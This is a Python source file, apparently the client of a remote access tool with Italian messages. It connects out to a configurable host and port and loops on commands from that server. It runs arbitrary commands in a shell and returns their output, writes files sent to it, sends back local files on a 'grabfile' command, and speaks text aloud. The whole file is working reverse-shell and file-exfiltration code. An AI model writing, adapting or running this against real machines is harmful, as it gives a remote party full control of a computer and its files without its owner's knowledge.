import os
import pyttsx3
import subprocess
import helpers as hlp
from termcolor import cprint
from helpers import BudaSocket, decode


def run(host, port):
    subprocess.run('chcp 65001', shell=True, capture_output=True)

    engine = pyttsx3.init()
    engine.setProperty('rate', 150)

    conn_loop = True
    while conn_loop:
        with BudaSocket.get_client(host, port) as client:
            try:
                while True:
                    client.send(os.getcwd())
                    data = client.recv()

                    if b'<END_OF_JSON_HEADER>' in data:
                        hlp.tcp_to_file(data)
                        client.send('File mandato con successo\n')
                        continue

                    cmd = decode(data)

                    if cmd == 'gn':
                        cprint('Buonanotte', 'magenta')
                        conn_loop = False
                        break
                    elif cmd.startswith('cd') and cmd != "cd":
                        cmd = hlp.fix_white_spaces(cmd)
                        try:
                            os.chdir('..' if cmd == 'cd..' else cmd[3:])
                            client.send('Directory cambiata\n')
                        except FileNotFoundError:
                            client.send('Directory non valida\n')
                        continue
                    elif cmd.startswith('speak'):
                        try:
                            engine.say(cmd.removeprefix('speak').lstrip())
                            engine.runAndWait()

                            client.send('Comando "speak" eseguito correttamente\n')
                        except IndexError:
                            client.send('Parametri comando "speak" non validi\n')
                        continue
                    elif cmd.startswith('grabfile'):
                        if cmd == 'grabfile':
                            client.send('Percorso file remoto mancante\n')
                        else:
                            path = cmd.removeprefix('grabfile').lstrip()
                            if os.path.isfile(path):
                                client.send_file(path)
                            else:
                                client.send('Percorso file remoto inesistente\n')
                        continue

                    p = subprocess.run(cmd, shell=True, capture_output=True)
                    client.send(p.stdout or p.stderr or ' ')
            except ConnectionResetError:
                hlp.print_error('Connessione resettata dal server', False)
            except ConnectionAbortedError:
                hlp.print_error('Connessione annullata dal server', False)


if __name__ == '__main__':
    run(hlp.argv_or_default(1, '127.0.0.1'), hlp.argv_or_default(2, 12345))
